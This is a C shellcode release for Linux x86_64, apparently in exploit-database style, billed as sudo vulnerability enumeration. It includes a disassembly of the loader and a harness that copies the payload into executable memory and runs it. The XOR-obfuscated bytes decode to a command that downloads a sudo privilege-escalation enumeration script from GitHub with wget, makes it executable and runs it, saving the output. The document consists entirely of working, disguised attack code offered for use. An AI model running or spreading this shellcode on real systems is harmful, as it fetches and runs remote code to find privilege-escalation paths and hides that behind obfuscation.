/*
 
sudo vulnerability enumeration shellcode [xordynamic] - Linux/x86_64
 
        Author : Kağan Çapar
        contact: kagancapar@gmail.com
        shellcode len : 245 bytes
        compilation: gcc -fno-stack-protector -z execstack [.c] -o []
 
"disasssemble only main."
 
0000000000001179 <main>:
    1179:       55                      push   %rbp
    117a:       48 89 e5                mov    %rsp,%rbp
    117d:       48 83 ec 20             sub    $0x20,%rsp
    1181:       89 7d ec                mov    %edi,-0x14(%rbp)
    1184:       48 89 75 e0             mov    %rsi,-0x20(%rbp)
    1188:       48 8d 05 d1 2e 00 00    lea    0x2ed1(%rip),%rax        # 4060 <shellcode>
    118f:       48 89 c7                mov    %rax,%rdi
    1192:       e8 99 fe ff ff          call   1030 <strlen@plt>
    1197:       48 89 c6                mov    %rax,%rsi
    119a:       48 8d 05 63 0e 00 00    lea    0xe63(%rip),%rax        # 2004 <_IO_stdin_used+0x4>
    11a1:       48 89 c7                mov    %rax,%rdi
    11a4:       b8 00 00 00 00          mov    $0x0,%eax
    11a9:       e8 a2 fe ff ff          call   1050 <printf@plt>
    11ae:       41 b9 00 00 00 00       mov    $0x0,%r9d
    11b4:       41 b8 ff ff ff ff       mov    $0xffffffff,%r8d
    11ba:       b9 22 00 00 00          mov    $0x22,%ecx
    11bf:       ba 07 00 00 00          mov    $0x7,%edx
    11c4:       be 00 01 00 00          mov    $0x100,%esi
    11c9:       bf 00 00 00 00          mov    $0x0,%edi
    11ce:       e8 6d fe ff ff          call   1040 <mmap@plt>
    11d3:       48 89 45 f8             mov    %rax,-0x8(%rbp)
    11d7:       48 83 7d f8 ff          cmpq   $0xffffffffffffffff,-0x8(%rbp)
    11dc:       75 19                   jne    11f7 <main+0x7e>
    11de:       48 8d 05 3a 0e 00 00    lea    0xe3a(%rip),%rax        # 201f <_IO_stdin_used+0x1f>
    11e5:       48 89 c7                mov    %rax,%rdi
    11e8:       e8 73 fe ff ff          call   1060 <perror@plt>
    11ed:       bf ff ff ff ff          mov    $0xffffffff,%edi
    11f2:       e8 79 fe ff ff          call   1070 <exit@plt>
    11f7:       48 8b 45 f8             mov    -0x8(%rbp),%rax
    11fb:       48 89 c2                mov    %rax,%rdx
    11fe:       48 8d 05 5b 2e 00 00    lea    0x2e5b(%rip),%rax        # 4060 <shellcode>
    1205:       b9 f6 00 00 00          mov    $0xf6,%ecx
    120a:       48 8b 30                mov    (%rax),%rsi
    120d:       48 89 32                mov    %rsi,(%rdx)
    1210:       89 ce                   mov    %ecx,%esi
    1212:       48 01 d6                add    %rdx,%rsi
    1215:       48 8d 7e 08             lea    0x8(%rsi),%rdi
    1219:       89 ce                   mov    %ecx,%esi
    121b:       48 01 c6                add    %rax,%rsi
    121e:       48 83 c6 08             add    $0x8,%rsi
    1222:       48 8b 76 f0             mov    -0x10(%rsi),%rsi
    1226:       48 89 77 f0             mov    %rsi,-0x10(%rdi)
    122a:       48 8d 7a 08             lea    0x8(%rdx),%rdi
    122e:       48 83 e7 f8             and    $0xfffffffffffffff8,%rdi
    1232:       48 29 fa                sub    %rdi,%rdx
    1235:       48 29 d0                sub    %rdx,%rax
    1238:       01 d1                   add    %edx,%ecx
    123a:       83 e1 f8                and    $0xfffffff8,%ecx
    123d:       c1 e9 03                shr    $0x3,%ecx
    1240:       89 ca                   mov    %ecx,%edx
    1242:       89 d2                   mov    %edx,%edx
    1244:       48 89 c6                mov    %rax,%rsi
    1247:       48 89 d1                mov    %rdx,%rcx
    124a:       f3 48 a5                rep movsq %ds:(%rsi),%es:(%rdi)
    124d:       48 8b 45 f8             mov    -0x8(%rbp),%rax
    1251:       48 89 05 08 2f 00 00    mov    %rax,0x2f08(%rip)        # 4160 <sc>
    1258:       48 8b 15 01 2f 00 00    mov    0x2f01(%rip),%rdx        # 4160 <sc>
    125f:       b8 00 00 00 00          mov    $0x0,%eax
    1264:       ff d2                   call   *%rdx
    1266:       b8 00 00 00 00          mov    $0x0,%eax
    126b:       c9                      leave  
    126c:       c3                      ret    
    126d:       0f 1f 00                nopl   (%rax)
 
*/
 
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
 
int (*sc)();
 
char shellcode[] =
"\xeb\x27\x5b\x53\x5f\xb0\xfc\xfc\xae\x75\xfd\x57\x59\x53\x5e"
"\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\x49\x89"
"\x74\x07\x80\x3e\xfc\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff"
"\xff\x01\xfc\x49\xb9\x2e\x63\x68\x6f\x2e\x72\x69\x01\x98\x51"
"\x55\x5e\x53\x67\x69\x2c\x62\x55\x5f\x53\xe9\x9e\x01\x01\x01"
"\x76\x66\x64\x75\x21\x69\x75\x75\x71\x72\x3b\x2e\x2e\x73\x60"
"\x76\x2f\x66\x68\x75\x69\x74\x63\x74\x72\x64\x73\x62\x6e\x6f"
"\x75\x64\x6f\x75\x2f\x62\x6e\x6c\x2e\x55\x49\x32\x79\x40\x42"
"\x44\x2e\x52\x54\x45\x4e\x5e\x4a\x48\x4d\x4d\x44\x53\x2e\x6c"
"\x60\x72\x75\x64\x73\x2e\x52\x54\x45\x4e\x5e\x4a\x48\x4d\x4d"
"\x44\x53\x77\x33\x2f\x33\x2f\x33\x2f\x72\x69\x21\x27\x27\x21"
"\x62\x69\x6c\x6e\x65\x21\x2a\x79\x21\x52\x54\x45\x4e\x5e\x4a"
"\x48\x4d\x4d\x44\x53\x77\x33\x2f\x33\x2f\x33\x2f\x72\x69\x21"
"\x27\x27\x21\x2f\x2e\x52\x54\x45\x4e\x5e\x4a\x48\x4d\x4d\x44"
"\x53\x77\x33\x2f\x33\x2f\x33\x2f\x72\x69\x21\x3f\x21\x73\x64"
"\x72\x74\x6d\x75\x2f\x75\x79\x75\x01\x57\x56\x55\x5f\x6b\x3a"
"\x59\x0e\x04\x49\x89";
 
 
int main(int argc, char **argv) {
    printf("library Length: %zd Bytes\n", strlen(shellcode));
 
    void *ptr = mmap(0, 0x100, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
 
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
 
    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;
 
    sc();
 
    return 0;
}
